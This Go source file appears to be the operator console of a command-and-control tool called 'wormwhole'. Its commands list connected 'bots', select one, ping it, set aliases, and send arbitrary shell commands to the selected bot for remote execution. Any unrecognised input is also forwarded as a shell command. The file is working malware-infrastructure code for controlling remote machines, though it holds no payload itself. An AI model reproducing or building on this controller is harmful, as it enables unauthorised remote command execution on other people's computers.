package console

import (
	"fmt"
	"github.com/fatih/color"
	"github.com/xorium/wormwhole/server"
	"os"
	"regexp"
	"strconv"
)

func (c *Console) initCommands() {
	c.commandsHandlers = map[*regexp.Regexp]func([]string) error{
		regexp.MustCompile("help *"):        c.HelpCmdHandler,
		regexp.MustCompile("exit *"):        c.ExitCmdHandler,
		regexp.MustCompile("exec +(.+)"):    c.ExecCmdHandler,
		regexp.MustCompile("ping *"):        c.PingCmdHandler,
		regexp.MustCompile("list *"):        c.ListCmdHandler,
		regexp.MustCompile("cmd_states *"):  c.ListCommandsStatesCmdHandler,
		regexp.MustCompile("select (\\d+)"): c.SelectCmdHandler,
		regexp.MustCompile("alias +(.+)"):   c.AliasCmdHandler,
	}
}

func (c *Console) HelpCmdHandler(_ []string) error {
	color.Cyan(`help				print help for commands
exit				shutdown the server
ping				check if bot is alive
list				list connected bots
cmd_states			list commands states
exec [command]			execute shell command
select [bot number]		select bot to interact with
alias [bot name]		set alias to bot
	`)
	return nil
}

func (c *Console) handleCommandInput(text string) error {
	if c.currentState == stateExecutingCommand {
		return nil
	}
	for re, handler := range c.commandsHandlers {
		if re.MatchString(text) {
			return handler(re.FindStringSubmatch(text))
		}
	}
	return c.ExecCmdHandler([]string{"", text})
}

func (c *Console) ExitCmdHandler(_ []string) error {
	os.Exit(0)
	return nil
}

func (c *Console) ListCommandsStatesCmdHandler(_ []string) error {
	c.RLock()
	currBot := c.currentBot
	c.RUnlock()
	if currBot == nil {
		return fmt.Errorf("bot is unselected")
	}

	currentCommands := c.srv.ListCommands()
	if len(currentCommands) == 0 {
		color.HiYellow("there are no active commands yet")
		return nil
	}

	for _, command := range currentCommands {
		if command.Target() != currBot.ID {
			continue
		}
		color.HiYellow(command.String())
	}
	return nil
}

func (c *Console) ExecCmdHandler(matches []string) error {
	if len(matches) < 2 {
		return fmt.Errorf("incorrect command format")
	}
	c.RLock()
	currBot := c.currentBot
	c.RUnlock()
	if currBot == nil {
		return fmt.Errorf("bot is unselected")
	}

	c.Lock()
	c.currentState = stateExecutingCommand
	c.Unlock()
	return c.srv.SendCommand(
		server.ExecCommand(matches[1]),
		c.currentBot,
	)
}

func (c *Console) PingCmdHandler(_ []string) error {
	c.RLock()
	currBot := c.currentBot
	c.RUnlock()
	if currBot == nil {
		return fmt.Errorf("bot is unselected")
	}

	c.Lock()
	c.currentState = stateExecutingCommand
	c.Unlock()
	return c.srv.SendCommand(
		server.PingCommand(),
		currBot,
	)
}

func (c *Console) ListCmdHandler(_ []string) error {
	bots := c.srv.ListBots()
	if len(bots) == 0 {
		color.Yellow("there are no connected bots")
		return nil
	}
	c.Lock()
	c.currentBotsList = bots
	c.Unlock()
	listRes := ""
	for i, bot := range bots {
		botStr := c.getBotString(bot)
		listRes += fmt.Sprintf("[%d] %s\n", i, botStr)
	}
	color.HiBlue(listRes)
	return nil
}

func (c *Console) SelectCmdHandler(matches []string) error {
	if len(matches) < 2 {
		return fmt.Errorf("incorrect command format")
	}
	index, err := strconv.Atoi(matches[1])
	if err != nil {
		return fmt.Errorf("incorrect index: %s", matches[1])
	}
	if index >= len(c.currentBotsList) {
		return fmt.Errorf("index %d is out of range of bots list", index)
	}
	c.Lock()
	c.currentBot = c.currentBotsList[index]
	c.Unlock()
	return nil
}

func (c *Console) AliasCmdHandler(matches []string) error {
	if len(matches) < 2 {
		return fmt.Errorf("incorrect command format")
	}
	c.RLock()
	currBot := c.currentBot
	c.RUnlock()
	if currBot == nil {
		return fmt.Errorf("bot is unselected")
	}

	c.saveAlias(currBot.ID, matches[1])
	return nil
}
